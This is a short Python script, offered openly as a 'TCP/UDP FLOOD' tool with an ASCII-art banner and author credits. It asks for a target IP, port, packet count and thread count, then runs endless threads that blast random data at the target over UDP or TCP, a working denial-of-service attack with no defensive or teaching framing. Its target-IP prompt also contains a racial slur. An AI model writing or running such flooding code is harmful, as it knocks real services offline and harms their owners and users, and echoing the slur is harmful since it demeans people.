#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading
print("             ;::::;")
print("           ;::::; :;")
print("         ;:::::'   :;")
print("        ;:::::;     ;.")
print("       ,:::::'       ;           OOO\ ")
print("       ::::::;       ;          OOOOO\ ")
print("       ;:::::;       ;         OOOOOOOO")
print("      ,;::::::;     ;'         / OOOOOOO")
print("   ;:::::::::`. ,,,;.        /  / DOOOOOO")
print("  .';:::::::::::::::::;,     /  /     DOOOO")
print(" ,::::::;::::::;;;;::::;,   /  /        DOOO")
print(";`::::::`'::::::;;;::::: ,#/  /          DOOO")
print(":`:::::::`;::::::;;::: ;::#  /            DOOO")
print("::`:::::::`;:::::::: ;::::# /              DOO")
print("`:`:::::::`;:::::: ;::::::#/               DOO")
print(" :::`:::::::`;; ;:::::::::##                OO")
print(" ::::`:::::::`;::::::::;:::#                OO")
print(" `:::::`::::::::::::;'`:;::#                O")
print("  `:::::`::::::::;' /  / `:#")
print("   ::::::`:::::;'  /  /   `#")
print(" #############################")
print(" |   Coded By @Jax.Jacob_    |")
print(" |       TCP/UDP FLOOD       |")
print(" #############################")
ip = str(input(" niggas ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("#"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"HITTING OFF")
		except:
			print("HITTING OFF")

def run2():
	data = random._urandom(16)
	i = random.choice(("#"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"HITTING OFF")
		except:
			s.close()
			print("HITTING OFF")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
